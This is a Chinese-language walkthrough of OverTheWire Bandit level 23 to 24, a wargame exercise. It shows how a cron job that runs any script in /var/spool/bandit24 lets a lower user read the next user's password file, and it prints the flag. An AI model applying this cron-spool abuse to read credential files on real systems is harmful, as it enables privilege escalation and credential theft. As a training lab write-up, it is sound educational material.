# [Level 23 -> 24](http://overthewire.org/wargames/bandit/bandit24.html)

 shell script 初體驗。

## Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


### Commands you may need to solve this level

cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Writeups

這題依然跟```cron```有關，就讓我們直接看看```cronjob_bandit24```在做什麼：

```shell
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done
```

shell script 已經說出了一切，它會執行所有在```/var/spool/$myname```的檔案，在這裡的```$myname```也就是```bandit24```。所以我們現在要做的就是，把 shell script 放進```/var/spool/bandit24```，再請它把密碼吐出來囉！首先，創建一個的目錄，方便我們撰寫 script 及存放密碼：

```shell
bandit23@melinda:/etc/cron.d$ mkdir /tmp/bandit24script
bandit23@melinda:/etc/cron.d$ cd /tmp/bandit24script
```

撰寫```script.sh```：

```shell
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit24script/password.txt
```

開啟執行權限：

```shell
bandit23@melinda:/tmp/bandit24script$ chmod 777 script.sh
bandit23@melinda:/tmp/bandit24script$ ls -la
total 7868
drwxrwxr-x 2 bandit23 bandit23    4096 Aug  2 09:59 .
drwxrwx-wt 1 root     root     8036352 Aug  2 10:00 ..
-rwxrwxrwx 1 bandit23 bandit23      78 Aug  2 09:59 script.sh
```

開啟資料夾權限：

```shell
bandit23@melinda:/tmp/bandit24script$ chmod 777 .
bandit23@melinda:/tmp/bandit24script$ ls -la
total 7864
drwxrwxrwx 2 bandit23 bandit23    4096 Aug  2 10:04 .
drwxrwx-wt 1 root     root     8036352 Aug  2 10:07 ..
```

放進```/var/spool/bandit24```，等待```password.txt```：

```shell
bandit23@melinda:/tmp/bandit24script$ mv script.sh /var/spool/bandit24/
bandit23@melinda:/tmp/bandit24script$ ls
password.txt
bandit23@melinda:/tmp/bandit24script$ cat password.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Flag：```UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ```。

> [Next level（Level 24 -> 25）](https://github.com/YanHaoChen/OverTheWire-Writeups/blob/master/Bandit/Level24to25.md) 
